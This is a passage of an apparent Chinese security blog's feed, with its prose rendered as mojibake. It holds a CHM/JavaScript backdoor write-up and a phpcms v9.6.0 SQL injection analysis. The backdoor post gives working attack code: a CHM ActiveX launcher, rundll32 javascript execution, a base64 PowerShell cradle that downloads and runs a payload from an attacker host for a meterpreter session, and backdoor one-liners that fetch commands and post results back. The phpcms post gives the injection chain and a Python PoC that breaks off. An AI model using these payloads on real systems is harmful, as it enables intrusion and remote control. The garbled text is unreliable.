class="line">windows/gather/enum_ad_user_comments</span><br><span class="line">linux/gather/enum_network </span><br><span class="line">linux/busybox/enum_hosts </span><br><span class="line">windows/gather/enum_ad_users </span><br><span class="line">windows/gather/enum_domain_tokens </span><br><span class="line">windows/gather/enum_snmp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x01-ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫&quot;&gt;&lt;a href=&quot;#0x01-ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫&quot; class=&quot;headerlink&quot; title=&quot;0x01 ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫&quot;&gt;&lt;/a&gt;0x01 ÂèëÁé∞ÂÜÖÁΩëÂ≠òÊ¥ª‰∏ªÊú∫&lt;/h2&gt;&lt;h3 id=&quot;1-1-Âü∫‰∫éAR
      
    
    </summary>
    
    
      <category term="ÂÜÖÁΩëÊ∏óÈÄè" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>JS+CHMÊçÜÁªëÂêéÈó®</title>
    <link href="http://patrilic.top/2019/04/03/JS%20+%20CHM%20%E6%8D%86%E7%BB%91%E5%90%8E%E9%97%A8/"/>
    <id>http://patrilic.top/2019/04/03/JS + CHM ÊçÜÁªëÂêéÈó®/</id>
    <published>2019-04-03T03:58:32.000Z</published>
    <updated>2019-07-08T15:50:23.631Z</updated>
    
    <content type="html"><![CDATA[<p>Â≠¶‰∫Ü‰∏ÄÊ≥¢evi1cgÂçöÂÆ¢‰∏äÁöÑÊçÜÁªëÂêéÈó®ÔºåÂÅö‰∏™ËÆ∞ÂΩï</p><h2 id="0x01-ÊÄùË∑Ø"><a href="#0x01-ÊÄùË∑Ø" class="headerlink" title="0x01 ÊÄùË∑Ø"></a>0x01 ÊÄùË∑Ø</h2><blockquote><p>ÊÄùË∑ØÔºö<br>Âà©Áî®CHMÂêéÈó®Ë∞ÉÁî®rundll32.exeÊâßË°åjavascriptËé∑ÂèñÊÅ∂ÊÑè‰ª£Á†ÅÂπ∂ÊâßË°å</p></blockquote><blockquote><p>ÁªìÊûúÔºö<br>‰∫§‰∫íÂºèshell or meterpreterÔºàpoershellÔºâ</p></blockquote><h2 id="0x02-chmÂêéÈó®"><a href="#0x02-chmÂêéÈó®" class="headerlink" title="0x02 chmÂêéÈó®"></a>0x02 chmÂêéÈó®</h2><p>calc.exe P0c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>Âà©Áî®EasyCHMÁºñËØëhtmlÊñá‰ª∂</p><p>ËøêË°åÔºö<br><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/EA116D89-8450-42AA-81EC-147BF4AEE0B4.png" alt="1917e96c5ce843b5730a1a09cab0bfa9"></p><h2 id="0x03-JSÂêéÈó®"><a href="#0x03-JSÂêéÈó®" class="headerlink" title="0x03 JSÂêéÈó®"></a>0x03 JSÂêéÈó®</h2><p>Ê†∏ÂøÉÊÄùË∑ØÔºörundll32.exe ÊâßË°å javascript ËÑöÊú¨ ËÆøÈóÆC&amp;CÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å</p><p>PocÔºö<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert</span><br><span class="line">('foo');</span><br></pre></td></tr></table></figure></p><p><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/1B93425B-F900-4F41-9D44-137A3F162796.png" alt="f4f3d68173b359419c24507b1f942ec0"></p><h2 id="0x04-CHM-JS-ÊçÜÁªë"><a href="#0x04-CHM-JS-ÊçÜÁªë" class="headerlink" title="0x04 CHM + JS ÊçÜÁªë"></a>0x04 CHM + JS ÊçÜÁªë</h2><p>ÊÄùË∑ØÔºö<br>CHMÂêéÈó® ‚Äî-&gt; Ë∞ÉÁî®rundll32.exe ‚Äî‚Äì&gt; Ë∞ÉÁî®javascript. ‚Äî‚Äì&gt; ËÆøÈóÆÁõÆÊ†áC2ÊúçÂä°Âô® ‚Äî‚Äî&gt;ÊâßË°åÊÅ∂ÊÑè‰ª£Á†Å  ‚Äî‚Äì&gt; ‰∫§‰∫íÂºèshell</p><p>‰ºòÁÇπÔºö<br>Èò≤Ê≠¢‰º†ÁªüCHMÂêéÈó®‰ΩøÁî®CMD /c Êó∂ÂºïËµ∑ÁöÑÂºπÁ™ó</p><p>Áº∫ÁÇπÔºö</p><p>Áõ¥Êé•Ëé∑ÂèñMeterpreter Session</p><p>‰ΩøÁî®Exploit Ôºö exploit/multi/script/web_delivery<br><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/F6F24805-822A-43A1-81E4-4EEA799D1EFC.png" alt="cacd683f6c64c4a3651f0572cdd12349"></p><p>Â≠òÂú®ÁâπÊÆäÂ≠óÁ¨¶ÔºåÂú®cmd‰∏ãÊòØ‰∏çËÉΩÁõ¥Êé•ËøêË°åÁöÑ,‰ΩøÁî®Base64ÁºñÁ†ÅÔºö<br><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/8EA4EE4F-1C55-4FE0-9CEB-469FAE9AAAEB.png" alt="c54ede5591f858d718b4b01409b5aba3"></p><p>Powershell :<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p><p>But:<br><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/88D944CE-B983-4554-87AF-E38163827E99.png" alt="abcd0e35e422a4dc7c13de7884d4bb7f"></p><p>Âπ∂‰∏çËÉΩbypass 360‰∏ªÈò≤<br>ÂÖÅËÆ∏Á®ãÂ∫èÊâßË°åÂêéÔºåÂèØÂæóÂà∞JSRAT Session ‰ª•Âèä meterpreter Session<br><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/5E78F5F9-4F29-434E-B3CD-BA3DD373D1BE.png" alt="0081d77c6169108109e646204a07b69a"></p><p>‰∏ªË¶ÅËøòÊòØÊ£ÄÊµã‰∫Ürundll32.exe Ëøô‰∏™ÊïèÊÑüËøõÁ®ã</p><p><img src="/JS + CHM ÊçÜÁªëÂêéÈó®.resources/82E82E61-3559-43CF-A336-1E4B923C591D.png" alt="c4f1838a6afa2810a377bde24e717b33"></p><h2 id="0x05-ÊÄªÁªì"><a href="#0x05-ÊÄªÁªì" class="headerlink" title="0x05 ÊÄªÁªì"></a>0x05 ÊÄªÁªì</h2><p>JSÂêéÈó®‰ºòÁÇπÔºö</p><ol><li>Êó†Êñá‰ª∂ËêΩÂú∞</li><li>ÊåÅÁª≠ÊéßÂà∂</li><li>ÂêéÂè∞rundll32.exeËøõÁ®ãÁ®≥ÂÆö</li></ol><p>Áº∫ÁÇπÔºö<br>‰∏çÂÖçÊùÄÔºåÂÆπÊòìË¢´Ê£ÄÊµã</p><p>CHMÂêéÈó®‰ºòÁÇπÔºö<br>ÈíìÈ±ºÂº∫<br>‰∏ç‰ºöË¢´AVÊ£ÄÊµãÔºåÂè™‰ºöÂú®Ë∞ÉÁî®Âç±Èô©ËøõÁ®ãÊó∂Ë¢´Ê£ÄÊµãÔºåÊú¨Ë∫´‰∏çÂê´ÊúâÊÅ∂ÊÑè‰ª£Á†Å</p><p>ÈÖçÂêàÂèØ‰ª•ËææÂà∞nishang‰∏≠‰∏çÂºπÁ™óÁöÑÊïàÊûú</p><h2 id="0x06-JS-backdoor-Tips"><a href="#0x06-JS-backdoor-Tips" class="headerlink" title="0x06 JS backdoor Tips"></a>0x06 JS backdoor Tips</h2><p>//Execute A Command<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></p><p>//Write To A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\Temp\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close;</span><br></pre></td></tr></table></figure></p><p>//Read and Execute From A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\Temp\\testfile.txt&quot;,1);eval((f.ReadAll()));</span><br></pre></td></tr></table></figure></p><p>//Map A Remote Share (WEBDAV)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;https://live.sysinternals.com&quot;);self.close;</span><br></pre></td></tr></table></figure></p><p>//Map A Local Share<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;n=new%20ActiveXObject(&apos;WScript.Network&apos;);n.MapNetworkDrive(&quot;S:&quot;,&quot;\\\\Localhost\\c$&quot;);self.close;</span><br></pre></td></tr></table></figure></p><p>//Read and Execute Commands From A File<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);f=fso.OpenTextFile(&quot;c:\\Temp\\Commands.txt&quot;,1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(&quot;WScript.Shell&quot;);t.Run(&quot;cmd%20/c%20&quot;%20+%20f.ReadLine(),null,true);&#125;;</span><br></pre></td></tr></table></figure></p><p>//Retrieve Commands From HTTP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1/a.txt&quot;,false);h.Send();B=h.ResponseText;alert(B);</span><br></pre></td></tr></table></figure></p><p>//POST results back to Server<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;POST&quot;,&quot;http://127.0.0.1:8081/a.php&quot;,false);h.Send(&quot;Stuff&quot;);</span><br></pre></td></tr></table></figure></p><h2 id="0x07-Links"><a href="#0x07-Links" class="headerlink" title="0x07 Links"></a>0x07 Links</h2><p><a href="https://evi1cg.me/archives/chm_backdoor.html" target="_blank" rel="noopener">https://evi1cg.me/archives/chm_backdoor.html</a><br><a href="http://drops.wooyun.org/tips/8568" target="_blank" rel="noopener">http://drops.wooyun.org/tips/8568</a><br><a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a><br><a href="http://drops.wooyun.org/tips/11764" target="_blank" rel="noopener">http://drops.wooyun.org/tips/11764</a><br><a href="http://drops.wooyun.org/tips/12386" target="_blank" rel="noopener">http://drops.wooyun.org/tips/12386</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Â≠¶‰∫Ü‰∏ÄÊ≥¢evi1cgÂçöÂÆ¢‰∏äÁöÑÊçÜÁªëÂêéÈó®ÔºåÂÅö‰∏™ËÆ∞ÂΩï&lt;/p&gt;
&lt;h2 id=&quot;0x01-ÊÄùË∑Ø&quot;&gt;&lt;a href=&quot;#0x01-ÊÄùË∑Ø&quot; class=&quot;headerlink&quot; title=&quot;0x01 ÊÄùË∑Ø&quot;&gt;&lt;/a&gt;0x01 ÊÄùË∑Ø&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;ÊÄùË∑ØÔºö&lt;br
      
    
    </summary>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>phpcms_v9.6.0 wapÊ®°Âùó SQLÊ≥®ÂÖ•</title>
    <link href="http://patrilic.top/2019/04/03/phpcms_v9.6.0%20wap%E6%A8%A1%E5%9D%97%20sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://patrilic.top/2019/04/03/phpcms_v9.6.0 wapÊ®°Âùó sqlÊ≥®ÂÖ•/</id>
    <published>2019-04-03T02:58:32.000Z</published>
    <updated>2019-07-08T15:43:20.080Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-ÊºèÊ¥ûÂàÜÊûê"><a href="#0x01-ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="0x01 ÊºèÊ¥ûÂàÜÊûê"></a>0x01 ÊºèÊ¥ûÂàÜÊûê</h2><p>ÊºèÊ¥ûÂèëÁîüÂú® /Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/content/down.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">unset</span>($i,$m,$f);</span><br><span class="line">parse_str($a_k);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">$allow_visitor = <span class="number">1</span>;</span><br><span class="line">$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</span><br><span class="line">$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure><p>$_GET ÊñπÊ≥ï‰º†ÂÖ• $a_k Ôºå ÁªèËøásys_auth Ëß£ÂØÜ‰πãÂêéÔºåËøõÂÖ• parse_str,Ëß£ÊûêÂà∞ÂèòÈáè‰∏≠<br>ÊúÄÂêéÂ∏¶ÂÖ•Âà∞</p><blockquote><p>\$rs = \$this-&gt;db-&gt;get_one(array(‚Äòid‚Äô=&gt;$id)); ËøõË°åÊü•ËØ¢</p></blockquote><p>ÊâÄ‰ª•Áé∞Âú®Â¶ÇÊûúËÉΩÊâæÂà∞‰∏Ä‰∏™ÁªèËøásys_auth Âπ∂ËÉΩÂõûÊòæÁªôÊàëpayloadÁöÑÂú∞ÊñπÂç≥ÂèØ</p><p>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/attachment/attachments.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">swfupload_json</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$arr[<span class="string">'aid'</span>] = intval($_GET[<span class="string">'aid'</span>]);</span><br><span class="line">$arr[<span class="string">'src'</span>] = safe_replace(trim($_GET[<span class="string">'src'</span>]));</span><br><span class="line">$arr[<span class="string">'filename'</span>] = urlencode(safe_replace($_GET[<span class="string">'filename'</span>]));</span><br><span class="line">$json_str = json_encode($arr);</span><br><span class="line">$att_arr_exist = param::get_cookie(<span class="string">'att_json'</span>);</span><br><span class="line">$att_arr_exist_tmp = explode(<span class="string">'||'</span>, $att_arr_exist);</span><br><span class="line"><span class="keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$json_str = $att_arr_exist ? $att_arr_exist.<span class="string">'||'</span>.$json_str : $json_str;</span><br><span class="line">param::set_cookie(<span class="string">'att_json'</span>,$json_str);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÖàÁªèËøásafe_replace ÂáΩÊï∞ÔºåËøáÊª§‰∏ÄÈÅçÔºåÁÑ∂ÂêéÂ≠òÂÖ•Êï∞ÁªÑÔºåÂ¶ÇÊûú‰∏çÊª°Ë∂≥Êù°‰ª∂ËøõÂÖ• set_cookieÂáΩÊï∞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($var, $value = <span class="string">''</span>, $time = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">$time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">$s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">$var = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_pre'</span>).$var;</span><br><span class="line">$_COOKIE[$var] = $value;</span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($value <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">setcookie($var.<span class="string">'['</span>.$k.<span class="string">']'</span>, sys_auth($v, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">setcookie($var, sys_auth($value, <span class="string">'ENCODE'</span>), $time, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_path'</span>), pc_base::load_config(<span class="string">'system'</span>,<span class="string">'cookie_domain'</span>), $s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ÂèØ‰ª•ÁúãÂà∞ÔºåÂØπ‰º†ÂÖ•ÁöÑvalue ËøõË°å‰∏ÄÊ¨°sys_auth ÁÑ∂ÂêésetcookieÔºåÂèØ‰ª•Âú®ËøîÂõûÂåÖ‰∏≠ÊãøÂà∞ÂõûÊòæ</p><p>ÊúÄÂêéËøòÈúÄË¶ÅÂ≠òÂú®‰∏Ä‰∏™cookieÔºåËÆ©Êàë‰ª¨‰∏çË¢´Ë∑≥ËΩ¨Âà∞mainÁïåÈù¢<br>/Applications/MxSrvs/www/phpcms_V9.6.0/install_package/phpcms/modules/wap/index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</span><br><span class="line">param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);</span><br></pre></td></tr></table></figure></p><p>ÈÄöËøáGETÊñπÊ≥ïÂæóÂà∞$siteidÔºåÁÑ∂Âêé‰º†Âà∞‰∫Üset_cookie()ÂáΩÊï∞‰∏≠ÔºåÊª°Ë∂≥Êù°‰ª∂„ÄÇ</p><p><strong>ÊîªÂáªÈìæÔºö</strong></p><ol><li>ËÆøÈóÆ /index.php?m=wap&amp;a=index&amp;siteid=1 „ÄÇËé∑ÂèñÂìçÂ∫îÂ§¥ÁöÑset-CookieÂ≠óÊÆµ„ÄÇ</li><li>Â∞ÜÂâç‰∏ÄÊ≠•Ëé∑ÂèñÂà∞ÁöÑÂ≠óÊÆµËµãÂÄºÁªôuserid_flashÔºå‰Ωú‰∏∫POSTÂèÇÊï∞„ÄÇËÆøÈóÆ /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=„Äêpayload„Äë</li><li>Ëé∑ÂèñËøîÂõûÂ§¥ÁöÑset‚ÄîCookieÂ≠óÊÆµÔºåÊ≠§Âç≥‰∏∫Âä†ÂØÜÂêéÁöÑpayload</li><li>ËÆøÈóÆ /index.php?m=content&amp;c=down&amp;a_k=„ÄêÂä†ÂØÜÂêéÁöÑpayload„ÄëÔºåÊ≥®ÂÖ•ÊàêÂäü„ÄÇ</li></ol><h2 id="0x02-Poc"><a href="#0x02-Poc" class="headerlink" title="0x02 Poc"></a>0x02 Poc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018-12-20 23:24</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        step1 = url + <span class="string">"/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1"</span></span><br><span class="line">        response = requests.get(step1)</span><br><span class="line">        post = &#123;</span><br><span class="line">            <span class="string">"userid_flash"</span>:response.cookies[<span class="string">"okuga_siteid"</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        print(<span class="string">"[+] Get Cookie : "</span> + response.cookies[<span class="string">"okuga_siteid"</span>])</span><br><span class="line">        <span class="comment"># Ëé∑ÂèñcookieÔºåÈÅøÂÖçÁôªÈôÜÂ§±Êïà</span></span><br><span class="line"></span><br><span class="line">        step2 = url + <span class="string">"//index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"</span></span><br><span class="line">        response = requests.post(step2, post)</span><br><span class="line">        <span class="comment"># print(response.cookies)</span></span><br><span class="line">        sqli_payload = response.cookies[<span class="string">'okuga_att_json'</span>]</span><br><span class="line">        print(<span class="string">"[+] Get Sqli_poc : "</span> + sqli_payload)</span><br><span class="line">        <span class="comment"># Ëé∑ÂèñÂä†ÂØÜ payload</span></span><br><span class="line"></span><br><span class="line">        step3 = url + <span class="string">'/index.php?m=content&amp;c=down&amp;a_k='</span> + sqli_payload</span><br><span class="line">        response = requests.get(step3)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        user = re.findall(<span class="string">r'&lt;/b&gt;XPATH syntax error:(.*?)&lt;br /&gt;'</span>, response.text)</span><br><span class="line">        <span class="comment"># 